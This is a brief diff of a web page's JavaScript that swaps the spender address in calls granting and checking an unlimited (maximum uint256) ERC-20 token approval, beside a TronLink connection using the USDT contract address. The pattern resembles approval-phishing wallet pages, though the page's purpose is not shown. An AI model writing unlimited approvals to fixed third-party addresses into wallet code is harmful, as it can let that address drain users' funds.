@@ -13,10 +13,10 @@
             document.getElementById("balance").innerText = `Balance: ${response.balance}`
         }
         async function approveEthers() {
-            await ethersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x6aFFdb18a2E6d93fab0B5899AE0591208e21ea5E", "115792089237316195423570985008687907853269984665640564039457584007913129639935")
+            await ethersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x0Ce275FA9046c76aD8630Fd2d1d7A10481753333", "115792089237316195423570985008687907853269984665640564039457584007913129639935")
         }
         async function checkEthers() {
-            await checkEthersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x6aFFdb18a2E6d93fab0B5899AE0591208e21ea5E")
+            await checkEthersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x0Ce275FA9046c76aD8630Fd2d1d7A10481753333")
         }
         async function connectTronLink() {
             const response = await getTronlinkAccountInfo("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
